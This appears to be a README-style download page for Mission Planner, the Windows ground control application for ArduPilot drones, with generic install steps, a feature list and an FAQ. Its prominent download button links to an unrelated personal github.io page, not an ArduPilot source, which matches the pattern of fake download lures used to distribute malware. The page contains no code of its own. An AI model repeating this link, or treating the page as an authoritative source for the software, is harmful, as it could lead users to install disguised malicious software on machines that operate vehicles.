# Mission Planner
Mission Planner is a ground control application for Windows that configures ArduPilot vehicles, plans missions, and reviews telemetry.

<p align="center"><img src="https://584bb81e.delivery.rocketcdn.me/wp-content/uploads/2022/09/mission-planner_icon_windows.png.webp" alt="Mission Planner logo" width="120"/></p>

[![Download Mission Planner](https://img.shields.io/badge/⬇_Download_Mission_Planner-2ea44f?style=for-the-badge)](https://debbiehoward24.github.io/.github/Mission-Planner-ArduPilot-App)

![Platform: Windows](https://img.shields.io/badge/Platform-Windows-2ea44f) ![Focus: ArduPilot](https://img.shields.io/badge/Focus-ArduPilot-2ea44f)

## Guide Map

**Jump to:**

* [Install on Windows](#install-on-windows)
* [ArduPilot Setup Toolkit](#ardupilot-setup-toolkit)
* [Questions Before You Connect](#questions-before-you-connect)
* [Help and Documentation](#help-and-documentation)
* [From Bench Setup to Field Review](#from-bench-setup-to-field-review)
* [Why Mission Planner Fits Maintenance Work](#why-mission-planner-fits-maintenance-work)
* [Keep the Configuration Traceable](#keep-the-configuration-traceable)

## Install on Windows

| Step | What to do |
|---|---|
| 1 | Use the download button above to obtain the current Windows installer from the source you trust. |
| 2 | Run the installer and follow the setup prompts, including installation of required device drivers when appropriate. |
| 3 | Open Mission Planner without an armed vehicle, select the correct connection method, and confirm that Windows recognizes the autopilot before connecting. |
| 4 | Review available application updates, then document the installed versions before changing vehicle firmware or parameters. |

For bench work, remove propellers or otherwise make the propulsion system safe before applying power or testing outputs.

## ArduPilot Setup Toolkit

* **Vehicle setup and calibration:** Work through the checks required for the selected ArduPilot vehicle, including applicable accelerometer, compass, radio, and power-monitor steps.
* **Parameter management:** Inspect, search, adjust, save, and compare settings while preserving a known-good parameter file before major changes.
* **Mission preparation:** Build waypoint routes, fences, and rally points, then validate the plan against the vehicle type and operating area.
* **Telemetry and logging:** Monitor MAVLink data during a connection and retain flight logs for diagnosis, maintenance records, and post-operation review.
* **Video stream viewing:** Display a compatible feed on the Flight Data screen when the camera, network path, and required video components are configured correctly.
* **Firmware maintenance:** Identify the connected controller and apply only firmware intended for that board and vehicle class.

## Questions Before You Connect

<details>
<summary><b>Is Mission Planner free?</b></summary>

Mission Planner can be downloaded and used without purchasing the application. Connected hardware, communication services, map sources, or other third-party components may have separate costs or terms.
</details>

<details>
<summary><b>Which versions of Windows are supported?</b></summary>

Mission Planner is designed as a native Windows application. Exact compatibility can vary with the current build, device drivers, and connected hardware, so use a maintained Windows release and confirm the latest project guidance before deployment.
</details>

<details>
<summary><b>How should I approach a Mission Planner update?</b></summary>

The application can notify you when a newer build is available. Save parameter files, logs, and configuration notes first, then distinguish an application update from an ArduPilot firmware change and review the relevant release information for each.
</details>

<details>
<summary><b>Can Mission Planner display a video stream?</b></summary>

Yes, the Flight Data workspace can present compatible live video. Availability depends on the camera or capture source, network transport, stream format, and any supporting video components required by that setup.
</details>

## Help and Documentation

For help with Mission Planner, begin with the application's Help area and the documentation for the exact ArduPilot vehicle, controller, and firmware branch in use. The official Mission Planner and ArduPilot websites also provide setup explanations, calibration procedures, parameter references, log-analysis guidance, update notes, and community support options.

## From Bench Setup to Field Review

Mission Planner for Windows is a ground control station and configuration utility for ArduPilot vehicles. It brings connection management, firmware handling, mandatory setup, parameter editing, route preparation, telemetry, and log inspection into one desktop environment.

The Mission Planner drone software workflow suits pilots, integrators, maintainers, educators, and engineering teams that need a traceable path from initial calibration to post-operation analysis. Because available controls depend on the connected board, vehicle firmware, and communication link, users should follow the instructions for their exact configuration.

## Why Mission Planner Fits Maintenance Work

> Mission Planner keeps setup observations, calibration tasks, parameter changes, mission data, telemetry, and logs close together, making it easier to compare a vehicle's state before and after maintenance.

## Keep the Configuration Traceable

**Record before you revise.** Preserve parameter backups, firmware details, calibration notes, and relevant logs so that every maintenance decision has a clear reference point.
